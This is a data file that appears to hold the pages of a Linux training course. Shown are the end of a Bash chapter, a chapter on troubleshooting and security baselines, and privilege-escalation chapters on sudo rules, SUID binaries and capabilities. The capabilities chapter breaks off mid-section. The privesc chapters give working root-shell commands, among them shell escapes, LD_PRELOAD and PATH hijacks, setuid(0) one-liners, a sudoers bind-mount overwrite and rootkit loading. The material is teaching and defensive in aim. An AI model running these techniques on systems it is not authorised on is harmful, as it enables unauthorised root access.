File descriptors can be assigned and reused: exec 3> output.log printf 'hello\\n' >&3 exec 3>&- exec 3> opens descriptor 3 for writing. >&3 writes to it. exec 3>&- closes it. This is advanced shell work. Use it when a script needs several output streams, not as a default pattern. Parse options with getopts getopts handles short options in a portable way. #!/usr/bin/env bash set -euo pipefail verbose=0 output='' while getopts ':vo:h' opt; do case $opt in v) verbose=1 ;; o) output=$OPTARG ;; h) printf 'usage: %s [-v] [-o file] path\\n' \"$0\" exit 0 ;; :) printf 'missing argument for -%s\\n' \"$OPTARG\" >&2 exit 2 ;; \\?) printf 'unknown option: -%s\\n' \"$OPTARG\" >&2 exit 2 ;; esac done shift $((OPTIND - 1)) printf 'verbose=%d output=%s remaining=%s\\n' \"$verbose\" \"$output\" \"$*\" The leading : in ':vo:h' enables silent error handling so the script can print its own messages. OPTARG holds the option argument. OPTIND is the index of the first non-option argument. shift removes the parsed options. For long options, Bash has no built-in parser. Use a small manual loop or a portable argument parser. Do not pretend getopts handles --long options. Debugging and testing Print commands as they run: bash -x script.sh bash -n script.sh -x traces expansions and commands. -n checks syntax without running the script. Both are fast and should be part of your routine. Inside a script, enable tracing around a suspect block: set -x dangerous_function set +x trap can report where a script failed: trap 'printf \"failed at line %s\\n\" \"$LINENO\" >&2' ERR Use shellcheck for static analysis: shellcheck script.sh ShellCheck catches quoting mistakes, unused variables, incorrect tests and many portability problems. Fix warnings rather than suppressing them. If a warning is intentional, add a comment explaining why. A minimal test harness can run a script in a temporary directory: tmpdir=$(mktemp -d) trap 'rm -rf \"$tmpdir\"' EXIT cd \"$tmpdir\" printf 'alpha\\nbeta\\n' > input.txt result=$(grep -c alpha input.txt) [ \"$result\" -eq 1 ] || { printf 'expected 1 match, got %s\\n' \"$result\" >&2 exit 1 } This is not a full test framework, but it catches regressions and documents expected behavior. Portability and scheduling Bash is not POSIX shell. Features such as arrays, [[ ]], process substitution and local are extensions. If a script starts with #!/bin/sh, test it with dash or another POSIX shell. #!/bin/sh set -eu For maximum portability, avoid Bash-only syntax, use [ ] carefully and quote every expansion. For complex scripts, choose Bash deliberately and document the requirement. Scripts that must run on a schedule belong in cron or a systemd timer. crontab -e crontab -l A cron entry has five time fields followed by the command: 15 2 * * * /usr/local/bin/nightly-report.sh >> /var/log/nightly-report.log 2>&1 Cron uses a minimal environment. Use absolute paths, set PATH explicitly and redirect output. Test the exact command as the same user before trusting the schedule. Lab: write a system report Create report.sh that prints: The hostname. The kernel version. The current user. The root filesystem usage. The number of listening TCP sockets. Requirements: Use set -euo pipefail. Put the work in a main function. Quote every variable expansion. Exit with status 2 if an unexpected argument is supplied. Run shellcheck if it is installed. Common mistakes Omitting quotes around variables. Using [ $var = value ] when $var can be empty. Parsing ls output instead of using globs or find. Ignoring command failures. Using cd without checking that it succeeded. Checkpoint You should now be able to: Write a script with a shebang and strict mode. Quote variables and forward arguments safely. Use tests, conditionals, loops and functions. Handle expected failures and clean up with a trap. Read and adapt a small automation script. Next you will use logs and troubleshooting habits to keep a system healthy."},{"kind":"foundation","number":10,"order":110,"href":"foundations/10-logs-troubleshooting-security.html","slug":"10-logs-troubleshooting-security","page":"10-logs-troubleshooting-security.html","title":"Logs, Troubleshooting and a Secure Baseline","short":"Logs and security","summary":"Use logs and a repeatable method to diagnose failures and apply a secure baseline.","part":"foundations","partNum":"HF","partName":"Linux Foundations","readMinutes":19,"words":2751,"sections":20,"codeBlocks":26,"headings":[{"id":"where-logs-live","text":"Where logs live","level":2},{"id":"a-troubleshooting-method","text":"A troubleshooting method","level":2},{"id":"common-problems-and-first-checks","text":"Common problems and first checks","level":2},{"id":"investigate-a-full-disk","text":"Investigate a full disk","level":2},{"id":"investigate-a-service","text":"Investigate a service","level":2},{"id":"investigate-a-network-problem","text":"Investigate a network problem","level":2},{"id":"a-practical-security-baseline","text":"A practical security baseline","level":2},{"id":"quick-audit-commands","text":"Quick audit commands","level":2},{"id":"backups-and-recovery","text":"Backups and recovery","level":2},{"id":"logging-architecture","text":"Logging architecture","level":2},{"id":"auditing-and-file-integrity","text":"Auditing and file integrity","level":2},{"id":"performance-troubleshooting","text":"Performance troubleshooting","level":2},{"id":"a-stronger-security-baseline","text":"A stronger security baseline","level":2},{"id":"incident-response-basics","text":"Incident response basics","level":2},{"id":"backups-snapshots-and-recovery","text":"Backups, snapshots and recovery","level":2},{"id":"monitoring-without-a-platform","text":"Monitoring without a platform","level":2},{"id":"time-locale-and-certificates","text":"Time, locale and certificates","level":2},{"id":"lab-diagnose-a-controlled-failure","text":"Lab: diagnose a controlled failure","level":2},{"id":"common-mistakes","text":"Common mistakes","level":2},{"id":"checkpoint","text":"Checkpoint","level":2}],"text":"A Linux system tells you what it is doing through logs, process state, exit codes and resource counters. Troubleshooting is the skill of asking a precise question, collecting the right evidence and changing one thing at a time. Security is the habit of reducing unnecessary access before something goes wrong. Where logs live Modern systems centralize service logs in the systemd journal. Traditional text logs still exist under /var/log. journalctl --no-pager | tail -n 50 journalctl -b --no-pager journalctl -p err --no-pager journalctl --since '1 hour ago' --no-pager journalctl -u ssh --no-pager Location Contents journalctl systemd journal, service output and kernel messages /var/log/syslog General system log on Debian and Ubuntu /var/log/auth.log Authentication events on Debian and Ubuntu /var/log/kern.log Kernel messages /var/log/dpkg.log Package installation history /var/log/apt/ APT history and term logs /var/log/nginx/ Web server logs, when installed Log locations vary by distribution. If a file is missing, check the service configuration and the distribution documentation. dmesg shows the kernel ring buffer. It is useful for hardware, driver and boot messages: dmesg | tail -n 50 dmesg --level=err,warn A troubleshooting method Use the same loop every time: Define the symptom. \"The service is down\" is too broad. \"Requests to port 443 time out from this host\" is testable. Check the simple things. Is the host up? Is the cable or route present? Is the disk full? Is the clock correct? Reproduce the problem. Find the smallest command that shows the failure. Collect evidence. Read logs, inspect process state, check sockets and measure resources. Form one hypothesis. Change one variable at a time. Verify the fix. Repeat the original test and check the logs for new errors. Record what happened. Future you will forget the details. Avoid changing several things at once. If the problem disappears, you will not know which change fixed it. Common problems and first checks Symptom First checks Command not found PATH, package installed, typo, shell function Permission denied ls -l, id, directory execute bit, ACL, mount options Disk full df -h, df -i, du -sh, deleted open files Service will not start systemctl status, journalctl -u, config syntax Port already in use ss -tulpn, process owner, service conflict DNS fails /etc/resolv.conf, resolvectl, getent hosts, /etc/hosts SSH login fails key permissions, authorized_keys, sshd config, auth log Slow system uptime, top, free -h, vmstat, disk latency Boot fails GRUB, initramfs, fstab, root UUID, recovery shell Investigate a full disk df -h df -i du -sh /var/* | sort -h find /var/log -type f -size +100M -ls lsof +L1 df reports filesystem usage. du reports directory usage. lsof +L1 finds deleted files that are still open, which can hold space until the process is restarted. Do not delete logs blindly. Check the service owner, retention policy and whether the file is currently open. Prefer log rotation or a controlled truncate over removing an active file. Investigate a service systemctl status example --no-pager journalctl -u example -n 50 --no-pager systemctl cat example systemctl show example -p ExecStart,User,WorkingDirectory Read the unit, the service user, the working directory and the last error. A service can fail because a path is missing, a permission is wrong, a port is taken or a dependency is not ready. If you change a unit file: sudo systemctl daemon-reload sudo systemctl restart example systemctl status example --no-pager Investigate a network problem ip -brief addr ip route getent hosts example.com ss -tulpn curl -v --max-time 5 https://example.com Work from the bottom up: interface, address, route, name resolution, socket, application. If curl reaches an IP address but not a hostname, focus on DNS. If a local service listens on loopback only, a remote client cannot reach it. A practical security baseline You do not need a perfect hardening guide to improve a system. Start with these controls: Patch regularly. Apply security updates and reboot when the kernel or core libraries require it. Use least privilege. Do not run services as root without a specific reason. Give users only the sudo rules they need. Protect SSH. Prefer keys over passwords, disable direct root login where appropriate, and restrict access by user or network. Enable a firewall. Allow only the services that should be reachable. Test from another host. Remove unused software. Every installed service is another surface to maintain. Keep logs. Make sure the journal or remote log destination survives a reboot if you need evidence. Back up important data. Test a restore, not just a backup. Keep secrets out of shell history and world-readable files. Use a secret manager or restricted file permissions. Monitor changes. Track new services, new listening ports, new users and unexpected SUID files. Document the baseline. A control you cannot verify is only an intention. Quick audit commands who last -n 10 sudo -l ss -tulpn systemctl --failed find / -perm -4000 -type f 2>/dev/null find / -perm -0002 -type f 2>/dev/null df -h free -h Run these only on systems you own or are authorized to inspect. Interpret results in context. A SUID binary is not automatically malicious, and a world-writable file is not automatically a vulnerability. Backups and recovery A backup plan should answer: What data must survive? How often can it change? How long can the system be down? Where is the backup stored? Who can restore it? When was the last successful restore test? A copy on the same disk is not a backup. Keep at least one copy on a different device or location, and protect it from the same credentials that protect the live system. Logging architecture Linux logging is a set of layers, not one file. The kernel, systemd, services and applications all produce records. Those records may go to the journal, to syslog, to application-specific files or to a remote collector. Layer What it does Kernel ring buffer Hardware, driver, filesystem and boot messages systemd journal Collects service output, kernel messages and metadata rsyslog or syslog-ng Routes traditional syslog messages to files or remote hosts Application logs Service-specific files under /var/log or another configured path Log rotation Limits file size and retention Remote logging Sends copies to another host so local damage does not erase the record Check whether the journal is persistent: cat /etc/systemd/journald.conf ls -ld /var/log/journal journalctl --disk-usage If /var/log/journal does not exist and Storage=auto is set, the journal may be volatile and disappear at reboot. For a lab, volatile logs are fine. For a system you need to investigate, configure persistent storage or remote logging. Limit journal size and retention in /etc/systemd/journald.conf: [Journal] Storage=persistent SystemMaxUse=1G SystemKeepFree=2G MaxRetentionSec=30day After changing the configuration: sudo systemctl restart systemd-journald journalctl --vacuum-time=7d journalctl --vacuum-size=500M journalctl --vacuum-* deletes old entries. Confirm retention requirements before running it. Traditional logs are rotated by logrotate: cat /etc/logrotate.conf ls /etc/logrotate.d sudo logrotate -d /etc/logrotate.conf sudo logrotate -f /etc/logrotate.conf -d is a debug dry run. -f forces rotation. A misconfigured rule can fill the disk or delete logs you need. Test with -d first. Auditing and file integrity The audit subsystem records security-relevant events. It can log system calls, file access, user changes and command execution. sudo systemctl status auditd sudo auditctl -l sudo ausearch -m USER_LOGIN -ts today sudo aureport --summary sudo aureport -au auditctl -l lists active rules. ausearch queries the audit log. aureport summarizes events. Rules live in /etc/audit/rules.d/ on many distributions. A broad rule set can generate a large volume of data, so start with a focused policy. File integrity tools compare current files against a known baseline. sudo aide --init sudo aide --check debsums -c rpm -Va AIDE builds a database of hashes and metadata. debsums -c checks Debian package files against their recorded checksums. rpm -Va verifies RPM package files. These tools detect changes to packaged files, not changes to data or configuration outside the package database. A changed file is not automatically malicious. An administrator may have edited it, or a package update may have replaced it. Correlate with package history and logs. Inspect login history: who w last -n 20 lastlog journalctl -u ssh --since today --no-pager who shows current logins. w adds what each user is doing. last reads the login history. lastlog shows the most recent login for each account. These records can be incomplete or altered on a compromised host, so preserve them before cleanup. Performance troubleshooting A slow system is not always short on CPU. Check the four main resources: CPU, memory, disk and network. uptime top free -h vmstat 1 5 iostat -xz 1 5 pidstat 1 5 sar -u 1 5 uptime shows load averages. Load counts runnable and uninterruptible tasks. A high load with low CPU usage often points to blocked I/O. free -h shows memory, buffers, cache and swap. Linux uses spare memory for cache, so a low \"free\" value is normal. Look at available memory and swap activity. vmstat shows runnable processes, blocked processes, swap in and out, I/O and CPU. A persistent r queue or high wa time deserves attention. iostat -xz shows per-device utilization, queue size and latency. pidstat shows per-process CPU, memory and I/O. sar reads historical performance data when sysstat is installed and collection is enabled. Pressure stall information is available on newer kernels: cat /proc/pressure/cpu cat /proc/pressure/memory cat /proc/pressure/io The some and full lines report the percentage of time tasks were stalled. Rising full values for memory or I/O often explain latency better than average utilization. Investigate in this order: Define the symptom and the time window. Check load, CPU, memory, disk and network. Identify the busiest process or device. Correlate with logs and recent changes. Change one thing and measure again. Do not restart services at random. A restart hides evidence and may make the problem return later. A stronger security baseline The earlier baseline is a starting point. A reproducible baseline adds verification. Inventory the system. Know the OS, kernel, packages, services, users and listening ports. Patch on a schedule. Track security updates and reboot when required. Remove unused software and services. Every service is an attack surface. Use least privilege. Limit sudo, service accounts, capabilities and file permissions. Harden SSH. Keys only where possible, no direct root login, restrict users and source networks. Enable a default deny firewall. Allow only required inbound traffic. Enable auditing and persistent logging. Know what changed and keep the record. Protect secrets. Use a secret manager or restricted files, not shell history or world-readable configuration. Back up and test restores. A backup that has never been restored is a hope. Monitor drift. Alert on new users, new listening ports, new services, unexpected SUID files and package changes. Document exceptions. A control that is disabled needs an owner, a reason and an expiry date. Review regularly. A baseline is a process, not a one-time checklist. Useful verification commands: getent passwd | awk -F: '$3 >= 1000 {print $1, $3, $7}' ss -tulpn systemctl list-unit-files --type=service --state=enabled sudo find / -xdev -perm -4000 -type f -print 2>/dev/null sudo find / -xdev -perm -0002 -type f -print 2>/dev/null sudo apt list --upgradable -xdev keeps find on one filesystem. That avoids crawling network mounts and pseudo filesystems. Review the results in context. A SUID binary or a world-writable file may be intentional. Incident response basics An incident is not only a technical problem. It is a sequence of decisions under uncertainty. A small team needs a simple process. Prepare. Keep contacts, backups, logging and an isolated analysis machine ready. Identify. Confirm that an event is real and decide its scope. Contain. Stop the spread without destroying evidence. Isolate the host at the network layer when possible. Preserve. Capture memory, disk images, logs and relevant configuration before cleanup. Eradicate. Remove the cause, not only the symptom. Recover. Restore from a trusted baseline and monitor closely. Learn. Record what happened, what worked and what failed. Preservation commands depend on the environment. At minimum, record the time, the host, the current user, network connections, running processes and recent logs. date -u hostname who ss -tulpn ps -eo pid,ppid,user,stat,cmd journalctl --since '2 hours ago' --no-pager > incident-journal.txt Do not run a full forensic collection from memory on a production host. Use a documented procedure, write-blockers for disk images and a chain of custody. The goal of this section is to teach the first hour, not to replace a forensic analyst. Backups, snapshots and recovery A backup plan answers five questions: What data must survive? How much data can be lost? How long can recovery take? Where are the copies stored? Who has tested a restore? The 3-2-1 rule is a useful default: at least three copies, on two different media, with one off-site. It is not a law. A small lab may use a local snapshot plus an encrypted remote copy. Snapshots are not backups if they live on the same failing disk or in the same compromised account. They are useful for quick rollback, not for disaster recovery. Test restoration: rsync -av --dry-run backup/ restore/ sha256sum important.tar.gz tar -tzf important.tar.gz | head A dry run checks paths and permissions. A checksum verifies the copy. Listing an archive verifies that it can be read. None of these replaces a real restore into a clean directory. Monitoring without a platform You do not need a full observability stack to notice problems. Check disk space and inode use daily. Check failed systemd units after boot. Check the journal for repeated errors. Check listening ports after package changes. Check certificate expiry for public services. Check backup completion and restore tests. Check login failures and new accounts. Check time synchronization. A simple daily report script can cover the basics: #!/usr/bin/env bash set -euo pipefail printf 'host: %s\\n' \"$(hostname)\" printf 'uptime: %s\\n' \"$(uptime -p)\" printf 'disk:\\n' df -h / printf 'failed units:\\n' systemctl --failed --no-legend || true printf 'listening:\\n' ss -tulpn Run it from cron or a systemd timer and send the output to a location you actually read. A report nobody reads is not monitoring. Time, locale and certificates Correct time is a security control. TLS certificates, Kerberos tickets, logs and scheduled jobs all depend on it. timedatectl timedatectl status timedatectl list-timezones sudo timedatectl set-timezone Europe/London timedatectl shows the local time, universal time, time zone and synchronization state. A system with the wrong time may fail certificate validation or produce misleading logs. Check the time synchronization service: systemctl status systemd-timesyncd chronyc tracking chronyc sources systemd-timesyncd is a simple client. chrony is common on servers and can act as a client or a server. Only one time daemon should manage the clock at a time. Locale settings affect character encoding, collation and message language. locale localectl status localectl list-locales A UTF-8 locale is the normal choice: sudo localectl set-locale LANG=en_US.UTF-8 Locale changes affect new sessions and services. They can change sort order, date formats and how programs handle non-ASCII text. Test scripts and reports after changing the locale. Inspect TLS certificate expiry: openssl x509 -in cert.pem -noout -subject -issuer -dates openssl s_client -connect example.com:443 -servername example.com \u003c/dev/null 2>/dev/null \\ | openssl x509 -noout -subject -dates The first command reads a local certificate. The second opens a TLS connection and reads the server certificate. Check the subject, issuer and expiration date. A certificate can be valid but issued for the wrong name, so also verify the hostname and chain. For a quick expiry check in a script: end=$(openssl x509 -in cert.pem -noout -enddate | cut -d= -f2) date -d \"$end\" +%s Convert the result to a date and compare it with the current time. Alert before expiry, not after. Lab: diagnose a controlled failure In a disposable lab: Stop a non-essential service. Confirm the failure with systemctl status. Read the last 30 journal lines for that unit. Identify the first error, not the last symptom. Fix the cause. Restart the service and verify it is active. Write a three-line incident note: symptom, cause, fix. Then run the quick audit commands and explain which results are expected for your lab. Common mistakes Restarting a service before reading its logs. Deleting files to free space without finding the owner. Changing firewall rules without a second access path. Treating every warning as an emergency. Hardening a system without testing the result. Checkpoint You should now be able to: Find system and service logs. Follow a repeatable troubleshooting method. Diagnose disk, service, network and permission failures. Apply a practical security baseline. Verify a fix instead of assuming it worked. You now have the foundation to read the Linux for Hackers chapters with context. Start with Chapter 01, keep a lab snapshot and test every technique only on systems you own or have written permission to assess."}],"privesc":[{"kind":"privesc","number":1,"order":201,"href":"privesc/01-sudo-misconfigurations.html","slug":"01-sudo-misconfigurations","page":"01-sudo-misconfigurations.html","title":"Sudo Misconfigurations","short":"Sudo","summary":"Read sudo rules, spot shell escapes and understand the recent sudo vulnerability class.","part":"privesc","partNum":"PE","partName":"Privilege Escalation","readMinutes":4,"words":576,"sections":4,"codeBlocks":2,"headings":[{"id":"sudo-misconfigurations-for-privilege-escalation","text":"Sudo Misconfigurations for Privilege Escalation","level":2},{"id":"1-enumeration-the-first-step","text":"1. Enumeration: The First Step","level":3},{"id":"2-common-misconfigurations-and-exploitation","text":"2. Common Misconfigurations & Exploitation","level":3},{"id":"3-exploiting-vulnerabilities-in-sudo-itself","text":"3. Exploiting Vulnerabilities in Sudo Itself","level":3}],"text":"Sudo Misconfigurations for Privilege Escalation Sudo misconfigurations are a primary vector for local privilege escalation. A single overly permissive rule in /etc/sudoers can allow a low-privileged user to gain a root shell. The core vulnerability arises when a user is allowed to run a program that can spawn a shell, read/write any file, or manipulate system files . 1. Enumeration: The First Step An attacker's first action is to enumerate their own permissions. List Sudo Permissions: The sudo -l command is the primary tool used to list all commands a user is allowed to run as other users (including root) . If the NOPASSWD tag is set, this command requires no password, providing a complete view of the attack surface . 2. Common Misconfigurations & Exploitation There are several common patterns of insecure sudoers rules. A. The \"Blank Check\" (ALL) Rule This is the most critical misconfiguration, typically seen as (ALL) NOPASSWD: ALL . : This rule grants the user unrestricted power. The simplest way to exploit it is by spawning a root shell: or sudo /bin/bash sudo -i B. Allowing Shell-Spawnable Binaries This is a far more common and subtle misconfiguration. Many standard Linux binaries (editors, pagers, file readers) have built-in functionalities that can be used to execute arbitrary system commands. An administrator might grant sudo access to vim or less, thinking it's safe, but these can trivially be used to get a shell . Exploitation via GTFOBins: This technique relies on referencing the community-curated list GTFOBins . If a sudo-allowed binary is listed, the exact command to get a shell is provided . : find: sudo find . -exec /bin/bash \\; -quit vim/vi: sudo vim -c ':!/bin/bash' awk: sudo awk 'BEGIN {system(\"/bin/bash\")}' less: sudo less /etc/profile then type !sh nmap: For older versions, sudo nmap --interactive then !sh tar: sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash C. Allowing File Manipulation & Path Hijacking A rule that allows a binary to edit or write files can be just as dangerous. Example: sudo mkdir: If a user can run sudo mkdir, they can create a world-writable directory in a path that is automatically sourced by root. For instance, creating /etc/bash_completion.d/ as a writable directory allows an attacker to place a script that executes as root the next time a user logs in via bash . Example: sudo tee: A rule like user ALL=(root) NOPASSWD: /usr/bin/tee /var/lib/vz/* can be exploited using path traversal (../) to overwrite critical files like /etc/sudoers, granting full root access . D. Environment Variable Attacks (LD_PRELOAD) If the env_keep option in sudoers preserves the LD_PRELOAD environment variable, an attacker can compile a shared object (.so) containing a malicious setuid(0) payload and execute any allowed binary to escalate to root . 3. Exploiting Vulnerabilities in Sudo Itself Even a correctly configured sudoers file is not immune to vulnerabilities in the sudo binary itself. CVE-2025-32462 (host matching): A host-matching flaw in sudo before 1.9.17p1. When a sudoers rule names a host that is neither the current host nor ALL, listed users can run commands on unintended machines. This is not an -h command-line bypass. CVE-2025-32463 (--chroot exploit): In sudo versions 1.9.14 through 1.9.17, a user-controlled /etc/nsswitch.conf can be loaded when sudo runs with --chroot, allowing a local user to obtain root. This is a chroot path handling flaw, not a general sudoers misconfiguration. Mitigation: Both CVEs were fixed in sudo version 1.9.17p1. Check the vendor advisory for your distribution's backported fix and affected version range."},{"kind":"privesc","number":2,"order":202,"href":"privesc/02-suid-sgid-binaries.html","slug":"02-suid-sgid-binaries","page":"02-suid-sgid-binaries.html","title":"SUID and SGID Binaries","short":"SUID and SGID","summary":"Find privileged binaries, abuse GTFOBins entries and audit writable SUID files.","part":"privesc","partNum":"PE","partName":"Privilege Escalation","readMinutes":7,"words":813,"sections":6,"codeBlocks":11,"headings":[{"id":"suid-sgid-binaries-for-privilege-escalation","text":"SUID/SGID Binaries for Privilege Escalation","level":2},{"id":"1-understanding-suid-sgid","text":"1. Understanding SUID/SGID","level":3},{"id":"2-enumeration-finding-suid-sgid-binaries","text":"2. Enumeration: Finding SUID/SGID Binaries","level":3},{"id":"3-exploitation-strategies","text":"3. Exploitation Strategies","level":3},{"id":"4-automated-enumeration-tools","text":"4. Automated Enumeration Tools","level":3},{"id":"5-defensive-measures","text":"5. Defensive Measures","level":3}],"text":"SUID/SGID Binaries for Privilege Escalation SUID (Set User ID) and SGID (Set Group ID) are special Unix/Linux permissions that allow a binary to execute with the privileges of its owner (SUID) or group (SGID), rather than the user running it. This is necessary for legitimate operations (e.g., passwd needs root to update /etc/shadow), but misconfigurations or vulnerabilities in these binaries are a classic privilege escalation vector. 1. Understanding SUID/SGID : When set on an executable, it runs with the privileges. If owned by root, it runs as root. Permission display: -rwsr-xr-x (the s replaces the owner's x) : When set on an executable, it runs with the privileges. Permission display: -rwxr-sr-x (the s replaces the group's x) Key Distinction from Sudo: While sudo is configured per-user via /etc/sudoers, SUID/SGID binaries are system-wide - any user on the system can execute them with elevated privileges if the file permissions allow it. 2. Enumeration: Finding SUID/SGID Binaries Primary Commands: find / -perm -4000 -type f 2>/dev/null # Find all SGID binaries find / -perm -2000 -type f 2>/dev/null # Find both SUID and SGID find / -perm -6000 -type f 2>/dev/null # More comprehensive search find / -user root -perm -4000 -type f -exec ls -la {} \\; 2>/dev/null Legacy Method (older systems): find / -type f \\( -perm -04000 -o -perm -02000 \\) -exec ls -al {} \\; 2>/dev/null 3. Exploitation Strategies A. Known Vulnerable Binaries (GTFOBins) Many common binaries have built-in functions that can spawn shells when run with SUID privileges. Reference GTFOBins for the exact exploit syntax. Common Examples: Binary Exploit Command find find . -exec /bin/sh -p \\; -quit vim / vi vim -c ':!/bin/sh' nano nano → ^R^X → reset; sh 1>&0 2>&0 less / more less /etc/profile → !/bin/sh awk awk 'BEGIN {system(\"/bin/sh\")}' cp Copy /etc/shadow or /etc/sudoers to writable location nmap (old) nmap --interactive → !sh tar tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh Note: The -p flag in sh -p preserves the SUID privileges; without it, some shells drop privileges. B. Shared Object Hijacking (LD_PRELOAD / LD_LIBRARY_PATH) If a SUID binary loads a shared library from a relative path or user-writable directory, an attacker can replace or preload a malicious library. LD_PRELOAD Exploit: # Create malicious shared library echo 'int getuid() { return 0; }' > exploit.c gcc -shared -fPIC exploit.c -o exploit.so # Run SUID binary with LD_PRELOAD (if allowed) LD_PRELOAD=./exploit.so /path/to/suid/binary Library Path Hijack: # If binary loads libxyz.so from ./lib/ mkdir lib gcc -shared -fPIC -o lib/libxyz.so malicious.c PATH=.:$PATH /path/to/suid/binary Mitigation: Modern SUID binaries ignore LD_PRELOAD and LD_LIBRARY_PATH for security. C. Environment Variable Exploits Some SUID binaries use environment variables in unsafe ways: PATH Hijacking: If a SUID binary calls a command without using absolute paths (e.g., system(\"ls\") instead of /bin/ls), an attacker can modify the PATH to point to a malicious binary: export PATH=/tmp:$PATH echo '/bin/sh' > /tmp/ls chmod +x /tmp/ls /usr/bin/suid-binary # Now executes /tmp/ls as root IFS Exploitation: The IFS (Internal Field Separator) variable can be exploited in shell scripts with SUID: export IFS='/' ; /path/to/suid/script D. Buffer Overflows & Memory Corruption Historically, many SUID binaries have had memory corruption vulnerabilities. While patched on modern systems, legacy systems may still be vulnerable. Modern Example - CVE-2021-3156: A heap-based buffer overflow in sudo, a setuid-root binary, allowed local users to escalate to root on vulnerable versions. The bug was fixed in sudo 1.9.5p2. Patch level matters: a setuid binary is only a lead until you confirm the installed version is vulnerable. E. Weak File Permissions (Writable SUID Binaries) Sometimes an SUID binary is world-writable: # Check for writable SUID binaries find / -perm -4000 -perm -o+w -type f 2>/dev/null If found, an attacker can: Overwrite the binary with a custom malicious executable Set the SUID bit on the new binary Execute it to get root cp /bin/bash /tmp/rootbash chmod +s /tmp/rootbash /tmp/rootbash -p # -p preserves privileges F. Capability Leaks (POSIX Capabilities) Modern Linux uses capabilities instead of full SUID root. Misconfigured capabilities can be equally dangerous. Check capabilities: getcap -r / 2>/dev/null Dangerous Capabilities: cap_setuid+ep: Can change UID to root cap_sys_admin+ep: Can mount filesystems, etc. cap_dac_override+ep: Can bypass file permissions Example Exploit: # Python with cap_setuid capability python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")' 4. Automated Enumeration Tools Several scripts automate the discovery of misconfigured SUID/SGID binaries: LinPEAS - Comprehensive Linux privilege escalation checker LinEnum - Lightweight enumeration script GTFOBins - Web-based reference for binary exploitation SUID3NUM - Dedicated SUID enumeration tool LinPEAS SUID check snippet: ./linpeas.sh | grep -i \"suid\" 5. Defensive Measures For System Administrators: Minimize SUID Binaries: Remove SUID bits from unnecessary binaries (chmod u-s /path/to/binary) Use Capabilities: Replace SUID with fine-grained setcap where possible Regular Audits: Periodically scan for new SUID binaries Mount Options: Use nosuid on partitions like /tmp and /home SELinux/AppArmor: Use MAC systems to restrict SUID binary behavior Monitor Logs: Watch for unusual SUID binary executions"},{"kind":"privesc","number":3,"order":203,"href":"privesc/03-linux-capabilities.html","slug":"03-linux-capabilities","page":"03-linux-capabilities.html","title":"Linux Capabilities","short":"Capabilities","summary":"Map capability sets, dangerous grants and inheritance paths on files and processes.","part":"privesc","partNum":"PE","partName":"Privilege Escalation","readMinutes":9,"words":940,"sections":10,"codeBlocks":21,"headings":[{"id":"linux-capabilities-for-privilege-escalation","text":"Linux Capabilities for Privilege Escalation","level":2},{"id":"1-understanding-linux-capabilities","text":"1. Understanding Linux Capabilities","level":3},{"id":"2-enumeration-finding-capabilities","text":"2. Enumeration: Finding Capabilities","level":3},{"id":"3-dangerous-capabilities-and-exploitation","text":"3. Dangerous Capabilities & Exploitation","level":3},{"id":"4-capability-inheritance-exploitation","text":"4. Capability Inheritance Exploitation","level":3},{"id":"5-file-vs-running-process-capabilities","text":"5. File vs. Running Process Capabilities","level":3},{"id":"6-other-dangerous-capabilities","text":"6. Other Dangerous Capabilities","level":3},{"id":"7-practical-exploitation-workflow","text":"7. Practical Exploitation Workflow","level":3},{"id":"8-automated-tools","text":"8. Automated Tools","level":3},{"id":"9-defensive-measures","text":"9. Defensive Measures","level":3}],"text":"Linux Capabilities for Privilege Escalation Linux capabilities are a fine-grained privilege model that replaces the all-or-nothing approach of SUID root. Instead of giving a binary full root privileges, specific capabilities are assigned. This is a more secure alternative to SUID, but misconfigured capabilities can be just as dangerous. 1. Understanding Linux Capabilities Capabilities divide root privileges into ~40 distinct units. A binary with capabilities runs with only those privileges, not full root. Key Concept: Capabilities can be assigned to: Files (executable binaries) - persist across executions Processes (running programs) - inherited at runtime Threads - per-thread privilege control Capability Sets: Effective (E): Currently active capabilities Permitted (P): Capabilities that can be used Inheritable (I): Capabilities passed to child processes Bounding (B): Maximum capabilities a process can gain 2. Enumeration: Finding Capabilities List all files with capabilities: getcap -r / 2>/dev/null # More targeted search getcap -r /usr/bin /usr/sbin /bin /sbin 2>/dev/null # Check specific binary getcap /usr/bin/python3 View process capabilities: # Check current process capsh --print # Check running process by PID cat /proc/\u003cPID>/status | grep Cap # Convert to human-readable capsh --decode=0x0000000000000000 3. Dangerous Capabilities & Exploitation A. CAP_SETUID + CAP_SETGID Allows changing the UID/GID of the process. Combined with binaries that can spawn shells, this grants full root. Exploitation: # Python with CAP_SETUID python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")' # Perl with capabilities perl -e 'use POSIX; POSIX::setuid(0); exec \"/bin/bash\";' # Ruby ruby -e 'Process::Sys.setuid(0); exec \"/bin/bash\"' Check for interpreters: getcap -r / 2>/dev/null | grep -E \"python|perl|ruby|php|node\" B. CAP_SYS_ADMIN Mount filesystems, manipulate kernel modules, and access raw block devices. Often leads to root. Exploitation Methods: 1. Mounting /etc: # Create a fake /etc with malicious sudoers mkdir /tmp/fake_etc echo 'user ALL=(ALL) NOPASSWD:ALL' > /tmp/fake_etc/sudoers mount --bind /tmp/fake_etc /etc sudo bash 2. Mounting /dev/loop for arbitrary file writes: # Create overlay filesystem to hide malicious files mount -t overlay overlay -o lowerdir=/etc,upperdir=/tmp/overlay,workdir=/tmp/work /etc 3. Kernel module loading: # Load malicious kernel module insmod /tmp/rootkit.ko C. CAP_DAC_OVERRIDE + CAP_DAC_READ_SEARCH Bypass file read/write/execute permissions. Can read any file on the system. Exploitation: # Read /etc/shadow (even with 000 permissions) cat /etc/shadow # Write to restricted files echo 'user:newpassword' > /etc/shadow # Execute files without execute permissions sh /tmp/script.sh # bypasses execute bit D. CAP_SYS_PTRACE Allows attaching to any process with ptrace(). This can inject code into root processes. Exploitation: # Attach to root process and inject shellcode gdb -p \u003croot_pid> (gdb) call system(\"/bin/bash\") Danger: This effectively allows reading memory from any process, including: SSH sessions (capture passwords) Running processes (dump sensitive data) Keylogging at system level E. CAP_SYS_MODULE Load and unload kernel modules. This is game over for system security. Exploitation: # Check if binary with CAP_SYS_MODULE exists getcap -r / 2>/dev/null | grep sys_module # If Python has this: python3 -c 'import os; os.system(\"insmod /tmp/rootkit.ko\")' F. CAP_NET_ADMIN + CAP_NET_RAW Network manipulation including: Packet sniffing/sniffing ARP poisoning Firewall bypass Exploitation: # 